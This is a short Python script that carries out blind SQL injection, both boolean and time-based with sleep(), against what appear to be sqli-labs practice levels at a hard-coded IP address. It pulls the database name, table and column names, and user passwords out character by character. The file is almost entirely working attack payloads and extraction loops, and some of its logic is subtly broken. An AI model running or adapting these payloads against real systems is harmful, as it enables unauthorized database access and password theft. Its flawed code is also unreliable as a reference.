import requests

url="http://58.240.236.231:27001/Less-9/?id="
#inDatabase = "'or substr((select database()),{0},1)='{1}'%23"
#inTable = "'or substr((select group_concat(table_name) from information_schema.tables where table_schema=dbname),{0},1)='{1}'%23"
#dbname=""
#inColumns = "'or substr((select group_concat(column_name) from information_schema.columns where table_name=tbname),{0},1)='{1}'%23"
#tbname=""
#inValue =  "'or substr((select group_concat(passwd) from users),{0},1)='{1}'%23"
t = "You are in"
res=""

#payload="1' or if(ascii(substr((select database()),{0},1))={1},sleep(3),0)%23"  #less-8
#payload="1' and if(ascii(substr((select database()),{0},1))={1},sleep(3),0)%23"  #less-9 tablename=security
payload="1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=security),{0},1))={1},sleep(3),0)%23"

for i in range(1,100):
    for j in range(1,126):
        #payload=inDatabase.format(i,chr(j))
        #foo=payload.format(i,chr(j)) #less-8
        foo=payload.format(i,j)  #less-9
        #print(url+foo)
        rep=requests.get(url+foo,timeout=3) #less-9
        #rep=requests.get(url+foo) #less-8
        try:  #less-9
            rep=requests.get(url+foo,timeout=3)
        except Exception:
            print("[+]"+chr(j))
            res+=chr(j)
            print(res)
            break
        #if t in rep.text:  #less-8
            #print("[+]"+chr(j))
            #res+=chr(j)
            #print(res)
            #break




